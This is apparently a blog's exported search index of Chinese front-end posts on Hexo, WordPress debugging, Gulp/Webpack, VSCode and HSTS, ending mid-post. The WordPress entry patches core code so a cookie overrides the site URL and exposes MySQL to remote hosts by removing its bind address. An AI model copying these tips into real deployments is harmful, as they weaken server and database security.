    <content type="text"><![CDATA[看到一篇文章，讲前端分九段，对每个段位做描述，这个描述显然不准确，《前端九段，你是哪一段？》 前端是技术岗，是为解决公司业务而设立的工种，非要用类似围棋九段来划分能力，那也需要从更加全面的角度去切割。我也尝试划出九段，给大家参考： 一段 能够使用 form 表单提交数据，并通过后台处理将数据展示出来，能够实现表单数据的异步校验。能实现这个功能，基本上对 html/js 有了基本的了解，也了解一点后端语言。 二段 能够搭建个人博客，将博客静态部署到 github pages，也能够动态部署到 Server，并准确对静态资源做缓存处理。能实现这个功能，基本上对 linux 简单命令和 http 相关知识有所了解，对 git 也有了一点了解。 三段 能够从零开始实现一个网站的前台和后台，能够良好的管理多页面的 css/js 文件，并且掌握基本的数据库知识，熟悉一门后端语言。 四段 能够使用构建工具对前端代码进行编译、合并、压缩等处理，能够简单地设计一个网站的架构，并且能够对架构做持续调优。这一段位需要具备基本的工程化能力和架构能力。 五段 掌握网页的各种调试手段，对 Native 知识有基本了解，能够对大流量的网站做优化处理，能够考虑网页的性能优化问题，对新技术有自己的认知，熟悉掌握一门后端语言，并且了解基本的运维知识。 六段 在前端技术使用上可以游刃有余，能够在项目开发中担任 PM 角色，可以针对一个项目作出全面的技术方案评估，并可以良好的落地方案，能够作出准确的技术选型，了解不同工具、框架的长短处，能够带领 3~5 人进行项目开发。 七段 能够在团队的边界技术上有所突破，能够看到项目和团队的问题，找到解决方案，提升团队的整体水平，用技术帮助业务获得持续发展的可能。 八段 能够在前端的边界上有所突破，引领行业的发展。能够对前端在下一个阶段的发展作出定义。 九段 有资格跟「前端阿尔法狗」对战。 从来没有什么固定的标准来划分前端段位，以上也只是笔者针对能力要求的一个简单划分，比如有些同学对 CSS 研究深入，在全栈和全端并没有什么的沉淀，那是不是连一段都没有呢？当然不是，在公司，只要是能够帮助业务解决问题的前端，都是好前端！ 以上，如果理解有偏差，勿喷，仅供娱乐。]]></content>
      <categories>
        <category>前端杂谈</category>
      </categories>
      <tags>
        <tag>前端杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo 摸爬滚打之进阶教程]]></title>
    <url>%2Fblog%2F2017%2F05%2F29%2Fhexo%2F</url>
    <content type="text"><![CDATA[写博客有三个层次，第一层次是借鉴居多的博文，第二层次是借鉴后经过消化后有一定量产出的博文，第三层次是原创好文居多的博文。在参考了大量前辈搭建hexo的心得后，此文尽量把一些别人未提到的点以及比较好用的点给提出来。所以你在参考本文的时候，应该已经过完了hexo。本文有以下内容: 快速实现博客压缩 文章链接唯一化 添加酷炫的打赏二维码 自定义JS和CSS 添加酷炫的歌单模块以及播放器 github分支管理博客思路 秒传图片到七牛云并展现在博客中 将博客同时部署到github和coding 快速实现博客压缩项目压缩也叫代码丑化, 分别对 html、css、js、images进行优化，即把重复的代码合并，把多余的空格去掉，用算法把 images 进行压缩。压缩后的博客，加载速度会有较大的提升，自然能留住更多游客。 蛮多朋友使用了gulp对博客进行压缩，这也是一个办法，但在社区逛了下，找到了一个比较好用的模块hexo-all-minifier，这个模块集成了对 html、css、js、image 的优化。安装上此模块后，只要在根目录下的_config.yml文件中加上如下字段就可对博客所有内容进行压缩。12345678910111213141516171819202122232425html_minifier: enable: true ignore_error: false exclude:css_minifier: enable: true exclude: - '*.min.css'js_minifier: enable: true mangle: true output: compress: exclude: - '*.min.js'image_minifier: enable: true interlaced: false multipass: false optimizationLevel: 2 pngquant: false progressive: false 文章链接唯一化也许你会数次更改文章题目或者变更文章发布时间，在默认设置下，文章链接都会改变，不利于搜索引擎收录，也不利于分享。唯一永久链接才是更好的选择。 安装 1npm install hexo-abbrlink --save 在站点配置文件中查找代码permalink，将其更改为: 1permalink: posts/:abbrlink/ # “posts/” 可自行更换 这里有个知识点： 百度蜘蛛抓取网页的规则: 对于蜘蛛说网页权重越高、信用度越高抓取越频繁，例如网站的首页和内页。蜘蛛先抓取网站的首页，因为首页权重更高，并且大部分的链接都是指向首页。然后通过首页抓取网站的内页，并不是所有内页蜘蛛都会去抓取。 搜索引擎认为对于一般的中小型站点，3层足够承受所有的内容了，所以蜘蛛经常抓取的内容是前三层，而超过三层的内容蜘蛛认为那些内容并不重要，所以不经常爬取。出于这个原因所以permalink后面跟着的最好不要超过2个斜杠。 然后在站点配置文件中添加如下代码:1234# abbrlink configabbrlink: alg: crc32 # 算法：crc16(default) and crc32 rep: hex # 进制：dec(default) and hex 可选择模式： crc16 &amp; hex crc16 &amp; dec crc32 &amp; hex crc32 &amp; dec 添加酷炫的打赏二维码看了好些博客，支付宝的收款码和微信的收款码都是分开的，且是没有美化过的二维码，让人打赏的欲望自然就下降了。来看一下我的赞赏二维码(支持微信和支付宝支付哟) 实现这个酷炫二维码的流程如下： 首先，分别获得支付宝和微信的收款码 接着到芝麻二维码里将两张二维码合并 最后到第九工场生成自己喜欢的造型 讲生成的图片pay.png放到根目录的source文件中，并在主题配置文件中加上1alipay: /pay.png 打赏字体不闪动修改文件next/source/css/_common/components/post/post-reward.styl，然后注释其中的函数wechat:hover和alipay:hover，如下：123456789101112/* 注释文字闪动函数 #wechat:hover p&#123; animation: roll 0.1s infinite linear; -webkit-animation: roll 0.1s infinite linear; -moz-animation: roll 0.1s infinite linear;&#125; #alipay:hover p&#123; animation: roll 0.1s infinite linear; -webkit-animation: roll 0.1s infinite linear; -moz-animation: roll 0.1s infinite linear;&#125;*/ 自定义JS和CSS博主用的是next主题，别的主题目录结构可能不太一样，但是整个框架是一样的，生成方式是一样的，所以引用方式也是相同的 添加自定义js样式 首先把js文件放在\themes\next\source\js\src文件目录下 然后找到\themes\next\layout目录下的布局文件_layout.swig 把script引用代码加入到该文件中即可 &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/js文件名.js&quot;&gt;&lt;/script&gt; 添加自定义css样式添加外部css样式和引用自定义js代码是一样的，在对应css文件夹内添加自定义外部css样式文件，然后在layout文件中添加引用即可。也可以在\themes\next\source\css\_custom\custom.styl文件中进行样式的添加。 添加酷炫的歌单模块以及播放器这个模块借鉴了@小胡子哥。根据上面的自定义JS和CSS的知识点不难实现歌单模块以及播放器。效果如下图：核心代码在\themes\next\source\js\src\music\nmlist中，点击看源码，其核心思路就是通过jsonp的方式对定义好的歌单进行调用。 在调试的过程中，发现了小胡子哥代码的一个bug：当点击一个专辑暂停后，再点击其他的专辑，这时候点击暂停、播放的控制逻辑有错误。经过排查在nmlist.js文件中的bind方法中加上了$(&quot;#nmPlayer&quot;).removeAttr(&quot;data-paused&quot;)解决了这个bug。 再接着玩的话，可以给播放器加上歌词的功能。这里有一篇相关文章, 有机会可以去把玩一番。 github分支管理博客思路有一个问题，如果我电脑坏了怎么办，因为在github中的我们github.io项目是只有编译后的文件的，没有源文件的，也就是说，如果我们的电脑坏了，打不开了，我们的博客就不能进行更新了，所以我们要把我们的源文件也上传到github上。这个时候我可以选择新建一个仓库来存放源文件，也可以把源文件 push 到 user.github.io 的其他分支。我选择了后者。 创建muyy(任意)分支创建两个分支：master 与 muyy,（这个muyy分支就是存放我们源文件的分支，我们只需要更新muyy分支上的内容据就好，master上的分支hexo编译的时候会更新的） 初始化仓库然后我们再初始化仓库，重新对我们的代码进行版本控制12git initgit remote add origin &lt;server&gt; &lt;server&gt;是指在线仓库的地址。origin是本地分支,remote add操作会将本地仓库映射到云端 将博客源文件上传至muyy分支.gitignore文件作用是声明不被git记录的文件，blog根目录下的.gitignore是hexo初始化带来的，可以先删除或者直接编辑，对hexo不会有影响。建议.gitignore内添加以下内容：123/.deploy_git/public/_config.yml .deploy_git是hexo默认的.git配置文件夹，不需要同步public内文件是根据source文件夹内容自动生成，不需要备份，不然每次改动内容太多即使是私有仓库，除去在线服务商员工可以看到的风险外，还有云服务商被攻击造成泄漏等可能，所以不建议将配置文件传上去 依次执行123git add .git commit -m "..."git push origin muyy 秒传图片到七牛云并展现在博客中在markdown中写blog的朋友，想必这点是最烦恼的吧，一般来说都要手动上传图片到七牛云，再把链接写到markdown中。逛了逛社区，有人用phthon实现一个自动上传的脚本，但是我觉得还不是特别方便，这时在github上找到一个一键贴图工具qiniu-image-tool，它支持本地文件、截图、网络图片一键上传七牛云并返回图片引用。Mac 是基于 Alfred 的，其 windows 也有相应版本windows版本。 按照其要求配置好以后，用截图软件截图后，或者本地图片后 copy，然后直接按设置好的 command+option+v，然后在图片成功上传到七牛云图床上，剪贴板上也有相应的连接。 将博客同时部署到 github 和 coding通常我们把hexo托管在github，但是毕竟github是国外的，访问速度上还是有点慢，所以想也部署一套在国内的托管平台，目前gitcafe已经被coding收购了，所以就决定部署到coding。但是coding有个不好的地方就是访问自定义域名的站点时，不充值的话会有广告跳转页，所以我现在也是处于观望的态度，先把coding的环境代码也先布置好，等它哪一天广告跳转页没了，就把域名指过去。 coding 上创建一个新项目这里只介绍 coding 上面如何创建项目，以及把本地 hexo 部署到 coding 上面 同步本地 hexo 到 coding 上把获取到了ssh配置_config.yml文件中的deploy下，如果是第一次使用 coding 的话，需要设置SSH公钥，生成的方法可以参考coding帮助中心, 其实和 github 配置一模一样的。 本地打开 id_rsa.pub 文件，复制其中全部内容，填写到SSH_RSA公钥key下的一栏，公钥名称可以随意起名字。完成后点击“添加”，然后输入密码或动态码即可添加完成。 添加后，在git bash命令输入：1ssh -T git@git.coding.net 如果得到下面提示就表示公钥添加成功了：1Coding.net Tips : [Hello ! You've conected to Coding.net by SSH successfully! ] 想要同时部署到2个平台，就要修改博客根目录下面的_config.yml文件中的deploy如下根据Hexo官方文档需要修改成下面的形式123456deploy: type: git message: [message] repo: github: &lt;repository url&gt;,[branch] gitcafe: &lt;repository url&gt;,[branch] 所以我是这样的12345deploy:- type: git repo: github: https://github.com/MuYunyun/MuYunyun.github.io.git,master coding: git@git.coding.net:muyunyun/muyunyun.git,master 最后使用部署命令就能把博客同步到coding上面：1hexo deploy -g pages服务方式部署将代码上传至coding之后我们就要开启pages服务了，在pages页面我们只需要将部署来源选择为master分支，然后将自定义域名填写我们自己购买的域名就可以了 设置域名解析现在要实现国内的走coding，海外的走github，只要配置2个CNAME就行。域名解析如下： 参考资料 小胡子哥 Hexo Next主题设置和优化 Hexo 博客补丁 Water Sister’s Blog Hexo+NexT主题配置备忘 Cherry’s Blog Hexo 3.1.1 静态博客搭建指南 hexo的next主题个性化教程:打造炫酷网站 将hexo博客同时托管到github和coding]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wordpress 本地调试]]></title>
    <url>%2Fblog%2F2017%2F05%2F01%2F2017-05-01-wp-local-development%2F</url>
    <content type="text"><![CDATA[最近准备把博客迁移到 Wordpress 上，在主机上部署好了 Wordpress 后，遇到了一个头疼的问题，我期望将线上的环境同步一份到本地，本地代码与服务器保持同步，本地修改后可以及时预览。 看起来是个很简单的需求，但遇到了两个问题，下面说的比较详细，供小白参考。 资源引用Wordpress 在设置完站点 URL 和主页 URL 后，所有的资源引用都指向线上地址，比如我线上地址是 112.18.3.7:3333，进入后台管理页，会直接跳转到 http://112.18.3.7:3333/wp-admin/，根本不会进入我本地的 http://localhost:8888/wp-admin，原因很简单，WP 会从数据库读取这些配置信息，可以将 /wp-includes/option.php 中的 get_option 函数做一下修改： 1234567891011function get_option( $option, $default = false ) &#123; $BLOG_DEBUG = $_COOKIE["blog_debug"]; if ( $BLOG_DEBUG &amp;&amp; preg_match("/^https?:\/\/[\w-_.:]+$/", $BLOG_DEBUG) &amp;&amp; ($option == 'siteurl' || $option == 'home') ) &#123; return $BLOG_DEBUG; &#125; // ...&#125; 上面代码的意思是，如果访问站点时，找到了名叫 blog_debug 的 cookie，则将数据库取出来的 siteurl 和 home 两个值提换成 blog_debug 对一个的 cookie。那么，我们只需要在本地打开的 http://localhost:8888/ 页面中写上： 1document.cookie = 'blog_debug=http://localhost:8888'; 如上，就可以完成本地调试了。 远程访问数据库Linux 上安装数据库，默认只允许在 127.0.0.1 下访问，外部是访问不了的，比如通过 112.18.3.7:3306，设置比较简单： 123# vim /etc/mysql/mysql.conf.d/mysqld.cnf# 注释下面这行# binding-adress = 127.0.0.1 然后重启 mysql 就好了： 1sudo /etc/init.d/mysql restart 当然，记得把 wp-config.php 中的 Mysql 主机地址修改下： 1define('DB_HOST', '112.18.3.7'); 小结使用 hexo 构建和 Github pages 部署博客有快两年时间了，博客文件多了之后，构建效率特别低，也不方便修改错别字。得尽快把博客迁移到服务器上~ P.S. 本地和服务器的代码同步，我使用的是 VSCode 的一个插件（ftp-sync）。]]></content>
      <categories>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>Wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解 Gulp 和 Webpack]]></title>
    <url>%2Fblog%2F2017%2F04%2F27%2F2017-04-27-gulp-and-webpack%2F</url>
    <content type="text"><![CDATA[Gulp 和 webpack 之间的关系是十分暧昧的，却也经常被人误解，以为它俩是竞争关系，其实不然。 Gulp 是一个任务管理工具，让简单的任务更清晰，让复杂的任务易于掌控；而 webpack 的理念是，一切皆为模块，每个模块在打包的时候都会经过一个叫做 loader 的东西，它具备非常强大的精细化管理能力，主要解决的是依赖分析问题。 Gulp 的学习，搞清楚 gulp.src, gulp.dest, gulp.task, gulp.watch 四个 API 就差不多了，它的底层原理是使用 Node 的 Transform Streams，这是一个可读可写可做中间转换的 Streams 管道，由于从 src 到 dest 过程中，文件一直停留在 Streams 中，没有落地成为实体文件，所以整体运作效率非常高。 Webpack 概念很多，但搞清楚 entry，output 和 loader 三个关键点，基本上就可以解决简单的问题了，稍微复杂的场景主要包括对资源的合并处理、分拆处理、多次打包等，部分这样的问题可以使用插件辅助解决，但是 Webpack 的强大并不在文件处理，而是依赖分析，所以在流程操作特别复杂的情况，webpack 并不能胜任工作，往往会被作为 gulp 的一个 task，整体工作流交给 gulp 主导。 插件推荐下面推荐几个 gulp 的插件吧，比较常用的： gulp-load-plugins：自动加载 package.json 中的 gulp 插件 gulp-rename： 重命名 gulp-uglify：文件压缩 gulp-concat：文件合并 gulp-less：编译 less gulp-sass：编译 sass gulp-clean-css：压缩 CSS 文件 gulp-htmlmin：压缩 HTML 文件 gulp-babel：使用 babel 编译 JS 文件 gulp-jshint：jshint 检查 gulp-imagemin：压缩 jpg、png、gif 等图片 gulp-livereload：当代码变化时，它可以帮我们自动刷新页面 也推荐几个 webpack 常用的 loader 和 plugin： Loader 列表 less-loader, sass-loader：处理样式 url-loader, file-loader：两个都必须用上。否则超过大小限制的图片无法生成到目标文件夹中 babel-loader，babel-preset-es2015，babel-preset-react：js 处理，转码 expose-loader： 将 js 模块暴露到全局 Plugin 列表 NormalModuleReplacementPlugin：匹配 resourceRegExp，替换为 newResource ContextReplacementPlugin：替换上下文的插件 IgnorePlugin：不打包匹配文件 PrefetchPlugin：预加载的插件，提高性能 ResolverPlugin：替换上下文的插件 DedupePlugin：打包的时候删除重复或者相似的文件 MinChunkSizePlugin：把多个小模块进行合并，以减少文件的大小 LimitChunkCountPlugin：限制打包文件的个数 MinChunkSizePlugin：根据 chars 大小，如果小于设定的最小值，就合并这些小模块，以减少文件的大小 OccurrenceOrderPlugin：根据模块调用次数，给模块分配 ids，常被调用的 ids 分配更短的 id，使得 ids 可预测，降低文件大小，该模块推荐使用 UglifyJsPlugin：压缩 js CommonsChunkPlugin：多个 html 共用一个 js 文件(chunk) HotModuleReplacementPlugin：模块热替换么，如果不在 dev-server 模式下，需要记录数据，recordPath，生成每个模块的热更新模块 ProgressPlugin：编译进度 NoErrorsPlugin：报错但不退出 webpack 进程 HtmlWebpackPlugin：生成 html 拓展阅读 http://huang-jerryc.com/2017/02/28/gulp-base/ http://www.thkdog.com/html5/2015/05/08/webpack.html]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>Gulp</tag>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[熟练工如何拔高 & 零碎知识的整理]]></title>
    <url>%2Fblog%2F2017%2F04%2F26%2F2017-04-26-about-improve%2F</url>
    <content type="text"><![CDATA[整理了一条圈子里头一位朋友的提问，这个问题比较普遍，我好好思考了下。问题如下： 我在前端方面有几年经验，切图仔-&gt;jQuery前端-&gt;Angular2+Webpack前端，可开发传统网页/SPA；略懂后端(API, CRUD)和服务器(简易脚本)；可独立完成中小型WEB项目并有成果； 但也就这样了，以下是我的问题： １、由于一直凭兴趣自学，在理论储备上非常不足；但理论和实践在到达一定层次前有巨大鸿沟，如何能有效通过学习理论提高实践能力？像我这种需要重视哪方面的学习？ ２、我是典型 Google &amp; StackOverflow Oriented Developer，不会就查，但总觉得这样不系统，请问一般是如何解决问题的？ 1、已经是个熟练工，如何在能力上再次拔高？在公司里，只要是踏踏实实做事情的，三两年的时间一定会有很明显的成长，不管是技术能力还是沟通能力。但也正是三两年后，会明确感觉到再一次遇到技术的瓶颈，这个问题不管是谁，都有，我也经常遇到上升的瓶颈，其实在这个圈子里，每个提问的同学都在促进我在思考，所以也比较感谢大家。 对碎片知识的学习是一个沉淀的过程，东一脚、西一脚，看似学的很杂很肤浅，但时间长了之后，每个领域都会涉及很多次，面广了，综合素质自然也就提升上去了。能力上再次拔高，我觉得需要做两件事情： 梳理知识，找到自己擅长的领域。前端技术越来越丰富，越深入的技术就越要花时间进去研究，我们不能 cover 到所有的面，但是可以抓住一个自己感兴趣或者擅长的方向，支出大把时间，深入研究。比如 Native、运维、Node、性能、WebVR 等等领域。在系统的架构设计上，进一步学习。这一块我个人的经验也不是特别丰富，但是这一块的学习还是一直坚持着，最基本的算法模型、数据结构、数据库知识、设计模式、性能调优、多人协作等等，我相信坚持一段时间的学习，再配上工作中项目的实践，一定会有效果出来。最主要的还是需要用抽象的眼光去看待新技术，从宏观上把握一门技术到底解决了哪些问题，是如何解决的问题，把思路掌握清楚。抽象思维不是与生俱来，也需要不断的训练，时间长了之后，看待问题的角度会不太一样。 2、如何整理零碎的知识？知识的整理永远都不要停留在键盘上或者笔杆上，需要对知识做一些区分。有几乎一直不变化的知识，比如 JS Core API、ECMA-262、HTTP/2 等等，这些属于标准，标准化的知识，需要有了解，部分可以当作工具书，部分则需要全部记住。还有一些在变化的知识，比如 MVC 演变出来的 MVVM、MVP 等，技术框架如 React、Angular、Vue 等，这些都属于变化的知识，他们有自己适用的场景，场景一变，这些东西都不适用了。 在学习这些变化的知识时，也有不变的东西存在，比如学习源码的技巧、调试 bug 的技巧等，这些是什么呢？是能力。知识是学不尽的，但是能力可以不断地提升，随着经验的丰富，能力也会跟着一起上去。如果给你一堆技术关键词，你可以很快很好地将这些词放入大脑的对应的知识储存区间中，那说明你已经对整个技术体系有了比较全面的理解，这个时候你需要提升的是能力，编程能力、理解能力、组织能力还有架构能力。 以上，仅供参考。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>小密圈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何快速上手一款 IDE - VSC 配置指南和插件推荐]]></title>
    <url>%2Fblog%2F2017%2F04%2F21%2F2017-04-21-something-about-vsc%2F</url>
    <content type="text"><![CDATA[VSCode 刚出来的时候并不是特别看好，因为 Sublime 和 Atom 的插件生态已经做起来了，成千上万个可供选择，VSC 从零开始，除了自身提供的几个内置插件外几乎没有多余的选择，没想到短短一年多的时间，发展如此快，下图是我在其他平台也比较常用的几个插件，我安装了挺多，大概二三十个。 当初看中 Atom 放下 Sublime 的主要原因是 Atom 可以让用户自定义界面，而且我学会了在 Atom 上写插件，觉得很爽，而且我也确实自定义了很多靠近自己使用习惯的内容。 如今投奔 VSC，原因是我发现自己并没有太多自定义 Editor 界面的需求，而且经常搞出一堆性能问题，潜进去解决这些问题太费时间了，尤其是 Atom 打开一个大文件慢的要命的问题，超过 1M 差不多就会把界面搞挂，这让我不可忍受。 VSC，怎么说呢，M$ 的大腿还是很粗的，同样底层用着 Electron，VSC 的水平要高 Atom 好几个档次，差距太大… 关于编辑器的个性化Sublime Text，Visual Studio Code，Atom，WebStorm 等编辑器，前三者的使用门槛都不高，最后一个由于自身过于强大，很多人对它都有点畏惧，这和对 VIM 的畏惧是不一样的，使用 Windows 的同学基本都会使用鼠标，VIM 是一款让你脱离鼠标的编辑器，需要记忆的快捷键比较多，它的插件配置也过于灵活，以至于很多人难以坚持使用它。 选择并坚持使用一个 IDE，我们会很关注它的使用效率，包括界面的美观和功能的完善度，比如支持换肤、能够调试多种语言、具备友好的控制台等等，这些特征 Atom、VSC 和 WebStorm 都具备。编辑器本没有什么好坏之分，你用得爽就最好了，我有一个朋友使用最简洁的记事本写过几个月程序，这也并不影响他的程序质量。 不过，在我看来， WebStorm 过于臃肿了，而且还不是免费的；Sublime 在插件机制上对前端也没有亲和力；Atom 的整体性能还达不到我理想中的要求；VIM 的理念过于深入，灵活性强到普通人都接受不了。从 Atom 到 VSC，我看重的只有 VSC 打开大文件效率这一点，而且作为一名优秀的编辑器，它该具备的都已经具备了，比如繁荣的插件生态，以及持续的版本迭代，这足以给我巨大的信心和勇气使用它。 从一个 IDE 转移到另一个，最让我们头疼的事情莫过于使用习惯，好在 ST、VSC、Atom 已经统一了这种习惯，比如使用 Command + Shift + P 调出 Pannel，便可以在这里做任何你想得到的事情。 拿到 VSC 的第一件事安装 VSC 后，我心里想的第一件事请就是，如何像使用 Atom 一样让我使用 VSC，毕竟我在 Atom 上配置了许多个性化的内容。一个编辑器的配置大体包括这三块： IDE 配置，调整字体、颜色、行高、行溢出等； 快捷键配置，比如多行编辑、预览设置、折行设置等； 插件配置，安装 IDE 辅助功能，而每个插件也包含上述两部分配置； 拿到 VSC 的第一件事请就是增加了两个快捷键，让我可以快速打开 IDE 配置界面和快捷键配置界面，快捷键的配置可以在这里找到： 进入之后，搜索 setting 和 keyboard 就可以进行设置了，打开 IDE 配置的快捷键我调整为 Command + ,，打开快捷键配置界面的快捷键我调整为 Command + Shift + ,，这个配置给我带来了很大的便利，配合关键字搜索，我几乎可以在十几秒内完成任何一个功能的快捷键配置和界面的修改。比如我需要在编码界面上增加一个尺子，提醒自己代码一行不要写太长，按下了 Command + ,，然后搜索 ruler，得到了这个： 左边是系统默认配置，可不更改，右侧是用户个性化配置，可以覆盖默认配置，我增加了一行： 1"editor.rulers": [80, 100] 于是我的界面上多了两条标尺线： 我用了大概一个小时，将自己最常用的快捷键配置好了，比如我最喜欢的多行编辑，换成了自己熟悉的快捷键（Gif图片）： 不管自己用了多久的 Atom 或者 ST，当这些基础配置完成之后，会觉得转投另一个 IDE 并非什么痛苦的事情。 接下来就是插件配置考虑一个 IDE，我会首先看看它是否有类似于 Sync 的插件，我有几台电脑，不可能每次换电脑都让我重新配置一次，我可经不起这个折腾，实际上，Atom 和 VSC 都提供了 Sync 插件，比如 VSC 的 Settings Sync，可以轻松将 IDE 的所有配置一键备份到 github 上，也可以将 github 上的配置一键拉取下来，然后重启 IDE 便可以共享同样的配置了。这个配置并不复杂，考虑到新手同学，我来简单介绍下它的使用： 在左侧的 sidebar 选中最后一个，搜索 Sync，不出意外，你会从前几个中找到下载量很高的那个 Settings Sync； 安装后，摁下 Command + Shift + P 打开控制面板，搜索 Sync，选择 update/upload 可以上传你的配置，选择 Download 会下载远程配置； 如果你之前没有使用过 Sync，在上传配置的时候，会让你在 Github 上创建一个授权码，允许 IDE 在你的 gist 中创建资源；下载远程配置，你可以直接将 gist 的 id 填入； 下载后等待安装，然后重启即可 为了界面美观，你可以下载 vscode-icons 和 xx-theme 主题，只要你想得到的，在插件市场中搜索，都可以先下载下来，然后通过控制面板搜索关键词进行配置，一些常用插件，也可以通过之前配置的 Command + , 和 Command + Shift + , 来调整符合你喜欢的使用方式i。 推荐一些插件VSC 内置了许多插件，需要我们配置的其实已经不太多了，我用的比较频繁的几个插件是： ESLint，检查代码格式 Insert Date String，插入诸如 2017-04-21 11:21:46 这个字符串，我写博客经常要用 Git History，查看代码的编辑历史 Prettify JSON，格式化 JSON 文件 Markdown Preview，预览 Markdown 文件 Code Runner，运行程序 Terminal，打开 zsh 控制台 View In Browser，打开 html 文件 Document This，自动生成注释 File Peek，类似于 Go To Definition，点击后定位文件 Image Preview，在行号左侧的小槽中展示图片的预览，MD 中也可以 hover 预览 以上是用的比较多的，还装了几十个使用频度比较低的插件，主要包括 Snippet 和文件高亮配置，可以在这里查看：https://gist.github.com/barretlee/a5170eb6ca1805f66687063d2e3a4983，你也可以通过 Settings Sync 将这个配置下载下来，id 就是后面半截：a5170eb6ca1805f66687063d2e3a4983。 在命令行打开 VSC在安装好 VSC 后，直接配置 .bash_profile 或者 .zshrc 文件： 1234alias vsc='/Applications/Visual\ Studio\ Code.app/Contents/Resources/app/bin/code';VSC_BIN='/Applications/Visual\ Studio\ Code.app/Contents/Resources/app/bin';PATH=$VSC_BIN:$PATH;export PATH; 然后让配置生效，在控制台执行： 12# 如果没有安装 zsh，可能是 ~/.bash_profilesource ~/.zshrc 这个时候就可以在全局打开了： 12# -a 的意思是不要新开窗口，在当前已经打开的 vsc 中打开文件vsc path/to/file.ext -a 有同学提到，VSC 的面板上搜索 install 就可以在命令行安装 code 这个命令了，不过我更喜欢使用 vsc 来打开文件，这也算是折腾吧 ；） 小结一款好的 IDE 能够帮助我们预防很多程序上愚蠢的问题，也能够聚合一系列小工具，避免我们频繁地切换工作区间。VSC 只是众多选择中的一个，熟悉其他编辑器的套路也是一样的。 「磨刀不误砍柴工」，花费点时间在工具的研究上，可以提升我们的开发和写作效率，提倡大家在这方面进行长时间的折腾。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>VSC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于开源精神和小密圈]]></title>
    <url>%2Fblog%2F2017%2F04%2F03%2F2017-04-03-about-secret-circle%2F</url>
    <content type="text"><![CDATA[看到有人关注和吐槽，我就过来说几句吧，当然我也知道，不管我下面说什么，都会有人顶和踩。 –&gt; 以下是回复脉脉上的一条匿名吐槽。 大概写了五六年博客，算起来应该有三四百多篇了吧，各大技术社群都转载过我的文章；微博也用了五六年，发了四五千条内容，百分之七十都是我工作中的感想，包括技术方面的分享。分享精神、开源意识从不是挂在嘴边，我自己也一直落实在行动上。无数个凌晨一点我还在写技术博文，几乎每个周末我都有学习和分享技术。所以我实名反对楼主所说“一点开源共享精神都没有”。 说到小密圈，这是一个尝试，明年我可能不会继续了。如果楼主稍微多看一眼我发表的状态，应该知道，我推过一个圈子叫「前端进阶」，目前已经快 600 人了，我建立圈子的初衷并不是为了捞钱，当然你非要这么说，那大家就这么理解好了，不过可以把我下面想说的话看完。 我很认同楼主所说开源共享，所以在圈子内我就跟圈友说了，一些有价值的内容我会分享到圈外，同时很多技术专题的分享，我会以开源的形式去开展，比如 performance-column，是一个性能相关的专题分享，让圈友在社区环境下沉淀知识，额外获得了圈外六百多人的长期围观。 我开放了自己的微信和邮箱，所以经常收到初学朋友的提问，这些提问很多都十分相似，所以我让他们统一在我的博客下留言。而小密圈更适合沉淀问答，后来我转移了阵地。 关于小密圈我就说这么多，有人说，你特么不收费照样可以分享呀！我也不在这里辩论要不要收费。我每天都会投入固定的时间回答问题、分享技术动态、准备技术专题，我期望新人能够在我创造的环境下有一点点提升，有人觉得很值，有人不屑一顾。在圈外，我也一直保持着分享的习惯，这点从未间断。 有序地经营一个圈子让我成长很多，在保持活跃度的情况下，还要有高质量内容的产出也不是一件轻松的事情。有人说技术人不适合搞这种小密圈，确实，它本身与开源精神是相违背的。这是我的第一次尝试，我希望尽力做到最好。 脉脉的匿名社区是一个开放平台，大家在这里都勇于说出自己的心声。我也是一个学习者，我接受大家的吐槽。 我的邮箱是 barret.china@gmail.com，微信是 barret_china，你可以过来直接批评我，当然也可以过来一起交流技术。]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊聊 HSTS 下的 HTTPS 降级问题]]></title>
    <url>%2Fblog%2F2017%2F04%2F01%2F2017-04-01-hsts-downgrade%2F</url>
    <content type="text"><![CDATA[HSTS 的作用是为了在用户通过 HTTP 访问网站时不需要服务器做 301/302 跳转，直接一个 307 本地强制使用 HTTPS 访问网站，这可以防止用户在第一次发出请求时被劫持，也减少了一次请求。 HSTS 是服务器（如 Nginx）通过一个 Strict-Transport-Security 请求响应头写入到客户端的，所以用户至少要访问一次这个网站，HSTS 才会生效。HSTS 还可以申请内置到浏览器中，Chrome 维护了 HSTS Preload List 名单，允许用户在从未访问某网站的情况下，第一次访问时就自动使用 HTTPS。安全性就更强了。 降级问题 那么问题就来了，如果你的域名服务器配置了 HSTS 策略，而网站因为某些原因又降级为 HTTP，此时客户端岂不是被坑到了？因为每次访问都会在本地强制使用 HTTPS，结果就是网站访问失败，如何解决呢？ HSTS 的设置时间一般都不短，而内置到 Chrome 中的 HSTS Preload List 要求更为严格，必须设置 18 周以上的缓存时间，如果想把自己的域名从名单中撤出来，需要经历漫长的审核以及浏览器的发版。 对于加到 Preload 的网站，基本无解，所以内心需要多么坚定地拥护 HTTPS 才敢走出这一步，可想而知。我查了下，BAT 都是没有加进去的，Google/Twitter/Facebook 倒是都加进去了。 使用 Chrome 工具删除 即便你的网站没加入到 Preload，遇到以上问题，其实也是无解的，只能等 HSTS 设置时间过期，或者告诉用户使用 Chrome 提供的开发者工具，将名单删除，怎么删除呢？ 在浏览器打开 chrome://net-internals/#hsts 这个页面，可以看到三个选项： Add domain，可以将你的域名添加到 Preload 中，这只在你的浏览器生效 Delete domain，将手动或者 Nginx 设置了 HSTS 的域名从浏览器删除，也就是上面问题的处理方案，但这里是删不掉内置到 HSTS Preload List 的域名的 Query domain，我就是从这里查到 